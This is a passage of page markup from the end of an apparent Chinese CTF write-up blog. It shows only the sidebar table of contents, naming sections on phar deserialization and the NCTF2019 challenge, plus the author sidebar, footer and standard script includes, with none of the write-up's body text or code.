          view.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#config-php%E7%9A%84File%E7%B1%BB%E7%9A%84%E6%B7%B1%E5%85%A5%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.2.4.</span> <span class="toc-text">
          config.php的File类的深入审计</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E5%88%A0%E9%99%A4hatccess%E5%B9%B6getshell"><span class="toc-number">3.3.</span> <span class="toc-text">
          0x03 phar反序列化攻击删除hatccess并getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ZipAechive"><span class="toc-number">3.3.1.</span> <span class="toc-text">
          ZipAechive</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0"><span class="toc-number">3.3.2.</span> <span class="toc-text">
          pop链的构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.3.3.</span> <span class="toc-text">
          上传木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar%E6%94%BB%E5%87%BB"><span class="toc-number">3.3.4.</span> <span class="toc-text">
          phar攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-number">3.3.5.</span> <span class="toc-text">
          getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF2019-phar-matches-everything"><span class="toc-number">3.4.</span> <span class="toc-text">
          [NCTF2019]phar matches everything</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3"><span class="toc-number">3.5.</span> <span class="toc-text">
          0x01 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.6.</span> <span class="toc-text">
          0x02 源码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#upload-php"><span class="toc-number">3.6.1.</span> <span class="toc-text">
          upload.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#catchmine-php"><span class="toc-number">3.6.2.</span> <span class="toc-text">
          catchmine.php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">3.7.</span> <span class="toc-text">
          0x03 攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">3.7.1.</span> <span class="toc-text">
          exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">3.7.2.</span> <span class="toc-text">
          payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ps"><span class="toc-number">3.7.3.</span> <span class="toc-text">
          ps</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">101</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.2</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Views</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>